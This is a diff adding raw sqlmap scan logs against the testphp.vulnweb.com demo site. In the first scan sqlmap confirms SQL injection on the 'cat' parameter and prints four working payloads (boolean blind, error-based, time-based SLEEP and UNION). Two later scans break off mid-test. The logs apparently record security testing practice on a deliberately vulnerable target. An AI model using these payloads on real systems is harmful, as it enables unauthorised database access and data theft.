@@ -1,0 +1,192 @@
+=== SQLMap Output: GET http://testphp.vulnweb.com/listproducts.php?cat=4 (get) ===
+___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:47:01 /2026-02-19/
+
+[21:47:02] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[21:47:02] [INFO] flushing session file
+[21:47:02] [INFO] testing connection to the target URL
+[21:47:02] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:47:03] [INFO] testing if the target URL content is stable
+[21:47:03] [INFO] target URL content is stable
+[21:47:03] [INFO] testing if GET parameter 'cat' is dynamic
+[21:47:03] [WARNING] GET parameter 'cat' does not appear to be dynamic
+[21:47:04] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')
+[21:47:04] [INFO] heuristic (XSS) test shows that GET parameter 'cat' might be vulnerable to cross-site scripting (XSS) attacks
+[21:47:04] [INFO] testing for SQL injection on GET parameter 'cat'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[21:47:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:47:04] [WARNING] reflective value(s) found and filtering out
+[21:47:08] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[21:47:09] [INFO] GET parameter 'cat' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --string="Our")
+[21:47:09] [INFO] testing 'Generic inline queries'
+[21:47:09] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[21:47:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[21:47:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[21:47:11] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[21:47:11] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[21:47:11] [INFO] GET parameter 'cat' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[21:47:11] [INFO] testing 'MySQL inline queries'
+[21:47:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[21:47:12] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
+[21:47:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[21:47:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[21:47:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[21:47:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[21:47:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[21:47:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[21:47:28] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[21:47:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[21:47:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[21:47:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[21:47:31] [INFO] target URL appears to have 11 columns in query
+[21:47:32] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cat=(SELECT (CASE WHEN (8102=8102) THEN 4 ELSE (SELECT 3934 UNION SELECT 3823) END))
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=4 AND GTID_SUBSET(CONCAT(0x7176786a71,(SELECT (ELT(8614=8614,1))),0x7171627171),8614)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=4 AND (SELECT 9567 FROM (SELECT(SLEEP(5)))zOPM)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176786a71,0x755a6474734f61534941556b62746554444e434549634b774779746c5858454363724a6e45484750,0x7171627171),NULL,NULL,NULL-- -
+---
+[21:47:32] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+[21:47:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 21:47:36 /2026-02-19/
+
+=== SQLMap Output: GET http://testphp.vulnweb.com/hpp?pp=12 (get) ===
+___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:47:36 /2026-02-19/
+
+[21:47:36] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[21:47:36] [INFO] flushing session file
+[21:47:36] [INFO] testing connection to the target URL
+got a 301 redirect to 'http://testphp.vulnweb.com/hpp/?pp=12'. Do you want to follow? [Y/n] Y
+[21:47:37] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:47:38] [INFO] testing if the target URL content is stable
+[21:47:38] [WARNING] GET parameter 'pp' does not appear to be dynamic
+[21:47:39] [WARNING] heuristic (basic) test shows that GET parameter 'pp' might not be injectable
+[21:47:40] [INFO] heuristic (XSS) test shows that GET parameter 'pp' might be vulnerable to cross-site scripting (XSS) attacks
+[21:47:40] [INFO] testing for SQL injection on GET parameter 'pp'
+[21:47:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:47:41] [WARNING] reflective value(s) found and filtering out
+[21:47:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[21:47:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[21:47:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[21:47:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[21:48:02] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[21:48:06] [INFO] testing 'Generic inline queries'
+[21:48:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[21:48:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[21:48:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[21:48:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[21:48:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[21:48:26] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[21:48:30] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[21:48:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[21:48:43] [WARNING] GET parameter 'pp' does not seem to be injectable
+[21:48:43] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 21:48:43 /2026-02-19/
+
+=== SQLMap Output: POST http://testphp.vulnweb.com/search.php?test=query (form-post) ===
+___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.11#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:48:43 /2026-02-19/
+
+[21:48:43] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[21:48:43] [INFO] flushing session file
+[21:48:43] [INFO] testing connection to the target URL
+[21:48:44] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:48:44] [INFO] testing if the target URL content is stable
+[21:48:44] [INFO] target URL content is stable
+[21:48:44] [INFO] testing if POST parameter 'searchFor' is dynamic
+[21:48:45] [WARNING] POST parameter 'searchFor' does not appear to be dynamic
+[21:48:45] [INFO] heuristic (basic) test shows that POST parameter 'searchFor' might be injectable (possible DBMS: 'MySQL')
+[21:48:46] [INFO] heuristic (XSS) test shows that POST parameter 'searchFor' might be vulnerable to cross-site scripting (XSS) attacks
+[21:48:46] [INFO] testing for SQL injection on POST parameter 'searchFor'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[21:48:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:48:46] [WARNING] reflective value(s) found and filtering out
+[21:48:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[21:48:50] [INFO] testing 'Generic inline queries'
+[21:48:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[21:49:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[21:49:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[21:49:41] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[21:50:08] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[21:50:36] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+
+=== SQLMap Output: POST http://testphp.vulnweb.com/userinfo.php (form-post) ===
+___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:50:43 /2026-02-19/
+
+[21:50:43] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[21:50:43] [INFO] flushing session file
+[21:50:43] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://testphp.vulnweb.com/login.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[21:50:44] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:50:45] [INFO] testing if the target URL content is stable
+[21:50:46] [WARNING] POST parameter 'uname' does not appear to be dynamic
+[21:50:46] [INFO] heuristic (basic) test shows that POST parameter 'uname' might be injectable (possible DBMS: 'MySQL')
+[21:50:47] [INFO] heuristic (XSS) test shows that POST parameter 'uname' might be vulnerable to cross-site scripting (XSS) attacks
+[21:50:47] [INFO] testing for SQL injection on POST parameter 'uname'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[21:50:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:50:52] [WARNING] reflective value(s) found and filtering out
+[21:50:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[21:50:55] [INFO] testing 'Generic inline queries'
+[21:50:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[21:51:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+got a refresh intent (redirect like response common to login pages) to 'https://tinyurl.com/ms9b5c8x'. Do you want to apply it from now on? [Y/n] Y
+
